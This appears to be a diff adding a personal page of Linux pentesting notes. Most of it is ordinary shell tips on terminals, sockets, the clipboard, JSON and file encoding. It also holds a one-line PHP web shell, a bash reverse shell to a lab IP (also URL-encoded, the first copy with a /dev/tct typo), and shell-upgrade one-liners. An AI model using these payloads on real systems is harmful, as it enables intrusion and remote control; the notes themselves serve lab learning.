@@ -1,0 +1,89 @@
+---
+description: 'Sorted Linux notes, need to separate to different pages and reorganize'
+---
+
+# Linux Notes
+
+## Linux
+
+Website for searching for shells through random programs such as 'vi' "living off the land binaries": [GTFObins](https://gtfobins.github.io/)
+
+### Upgrade shells:
+
+```text
+1. python -c 'import pty; pty.spawn("/bin/sh")'
+2. perl -e 'exec "/bin/sh";'
+3. ruby -e 'exec "/bin/sh"'
+```
+
+To upgrade to fully interactive shell \(python example\):
+
+```bash
+python -c 'import pty;pty.spawn("/bin/bash")'; 
+ctrl-z #send to background
+stty raw -echo #https://stackoverflow.com/questions/22832933/what-does-stty-raw-echo-do-on-os-x
+stty -a #get number of rows & columns
+stty rows <x> columns <y> #Set x number of rows & y columns
+fg #to return shell to foreground
+export TERM=xterm-color #allows you to clear console, and have color output
+```
+
+simple php shell: `<?php system($_GET['variable_name']); ?>`
+
+bash reverse shell:
+
+```text
+bash -i >& /dev/tct/10.10.14.148/9001 0>&1
+
+#URL encoded: 
+bash+-i+>%26+/dev/tcp/10.10.14.148/9001+0>%261
+```
+
+### Remote Code Execution
+
+[https://www.cyberciti.biz/faq/linux-unix-osx-bsd-ssh-run-command-on-remote-machine-server/](https://www.cyberciti.biz/faq/linux-unix-osx-bsd-ssh-run-command-on-remote-machine-server/) Run commands on remote system without a shell through SSH with a "Herefile"
+
+```text
+ssh server1 << HERE
+ command1
+ command2
+HERE
+```
+
+### Misc Linux
+
+Raw memory location so no files on disk: `/dev/shm/`
+
+list all running commands:
+
+```bash
+ps -eo command`
+#change delimiter to \n instead of <space> (loop by line): 
+IFS=$'\n'
+#Then loop through each line in output: 
+for i in $(ps -eo command); do echo $i; done
+```
+
+[https://unix.stackexchange.com/questions/211817/copy-the-contents-of-a-file-into-the-clipboard-without-displaying-its-contents](https://unix.stackexchange.com/questions/211817/copy-the-contents-of-a-file-into-the-clipboard-without-displaying-its-contents) script to copy contents of file directly to clipboard; Save in PATH location then enjoy!
+
+```text
+#! /bin/bash
+xclip -selection clipboard -i $@
+```
+
+'new' netstat: `ss -lnp | grep 9001` \#check if any connections on port 9001
+
+copy files to local machine without file transfer:
+
+```bash
+base64 -w 0 /path/of/file/name.file 
+#copy base64 then: 
+echo -n <base64material> | base64 -d > filename.file
+```
+
+pretty print JSON text in console \([https://www.howtogeek.com/529219/how-to-parse-json-files-on-the-linux-command-line-with-jq/](https://www.howtogeek.com/529219/how-to-parse-json-files-on-the-linux-command-line-with-jq/)\). Pipe the JSON output to `jq`. Example from NASA ISS API: `curl -s http://api.open-notify.org/iss-now.json | jq`
+
+### Check encoding of a text file
+
+`vi -c 'let $enc = &fileencoding | execute "!echo Encoding: $enc" | q' <file_to_check>` check encoding of a text file \(needed especially when doing crypto with python, or cracking passwords with `rockyou.txt` - _hint: needs latin encoding!_\) [https://vim.fandom.com/wiki/Bash\_file\_encoding\_alias](https://vim.fandom.com/wiki/Bash_file_encoding_alias) \(how to make an alias for the above command\)
+
